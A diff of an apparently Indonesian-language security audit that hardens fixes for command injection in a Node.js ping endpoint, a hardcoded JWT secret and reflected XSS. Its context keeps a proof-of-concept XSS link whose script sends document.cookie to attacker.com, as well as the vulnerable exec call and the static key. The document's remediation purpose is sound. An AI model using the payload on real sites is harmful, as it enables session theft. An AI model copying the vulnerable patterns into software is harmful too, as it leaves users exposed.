@@ -38,12 +38,12 @@ exec(`ping -c 1 ${host}`, (err, stdout, stderr) => {
 - **Solusi KONKRET**:
 ```javascript
 const { execFile } = require('child_process');
-// Validasi ketat format IP/Hostname menggunakan regex
-if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
-  return res.status(400).send('Invalid hostname format');
+// Validasi ketat format IP/Hostname — tidak boleh dimulai dengan dash
+if (!/^[a-zA-Z0-9][a-zA-Z0-9.-]*$/.test(host)) {
+  return res.status(400).json({ error: 'Invalid hostname format' });
 }
-execFile('ping', ['-c', '1', host], (err, stdout, stderr) => {
-  if (err) return res.status(500).send(err.message);
+execFile('ping', ['-c', '1', '--', host], (err, stdout, stderr) => {
+  if (err) return res.status(500).json({ error: 'Ping failed' });
   res.send(stdout);
 });
 ```
@@ -61,10 +61,14 @@ res.json({ token: "SUPER_SECRET_STATIC_JWT_KEY_12345", user: result.rows[0] });
 - **Solusi KONKRET**:
 ```javascript
 const jwt = require('jsonwebtoken');
+const secret = process.env.JWT_SECRET;
+if (!secret || secret.length < 32) {
+  throw new Error('JWT_SECRET is missing or insecurely short');
+}
 const token = jwt.sign(
   { id: result.rows[0].id, email: result.rows[0].email },
-  process.env.JWT_SECRET,
-  { expiresIn: '1h' }
+  secret,
+  { algorithm: 'HS256', expiresIn: '1h' }
 );
 res.json({ token, user: result.rows[0] });
 ```
@@ -81,10 +85,26 @@ res.send(`<h1>Halo, ${name}!</h1>`);
 - **Eksploitasi (PoC)**: Attacker mengirimkan link `http://target/greet?name=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`. Script dieksekusi di browser korban.
 - **Solusi KONKRET**:
 ```javascript
-// Gunakan template engine atau library sanitasi seperti he / sanitize-html
+// Gunakan template engine yang aman atau library sanitasi kontekstual
+// ⚠️ escapeHtml() di bawah HANYA aman untuk text node.
+// Untuk atribut href/src, gunakan sanitasi URL terpisah.
 const escapeHtml = (str) => String(str).replace(/[&<>"']/g, (m) => ({
   '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
 }[m]));
+
+// Validasi URL sebelum dipasangkan ke href untuk mencegah javascript: URI
+const sanitizeUrl = (url) => {
+  try {
+    const parsed = new URL(url);
+    // Blokir scheme berbahaya
+    if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
+      return '#';
+    }
+    return parsed.toString();
+  } catch (e) {
+    return '#';
+  }
+};
 
 res.send(`<h1>Halo, ${escapeHtml(name)}!</h1>`);
 ```
